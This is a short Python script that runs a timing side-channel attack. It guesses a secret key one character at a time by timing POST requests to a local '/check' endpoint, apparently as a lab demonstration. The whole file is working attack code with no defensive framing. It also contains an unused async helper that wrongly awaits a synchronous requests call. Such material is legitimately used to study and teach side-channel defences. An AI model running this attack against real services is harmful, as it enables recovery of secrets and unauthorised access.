import time
import string
import requests

URL = "http://127.0.0.1:5000/check"
SECRET_KEY = '******************'

async def postRequest(test_key):
    return await requests.post(URL, f"secret={test_key}" )

def timing_attack():
    guessed_key = ""
    for i in range(len(SECRET_KEY)):
        max_time = 0
        next_char = ""
        for char in string.ascii_lowercase + string.digits:
            test_key = guessed_key + char
            start = time.time()
            requests.post(URL, data={"secret": test_key})
            elapsed = time.time() - start
            if elapsed > max_time:
                max_time = elapsed
                next_char = char
        guessed_key += next_char
        print(f"Guessed so far: {guessed_key}")
    return guessed_key

if __name__ == "__main__":
    print("Starting timing attack...")
    guessed_secret = timing_attack()
    print(f"Guessed secret key: {guessed_secret}")
    print(f"Actual secret key: {SECRET_KEY}")

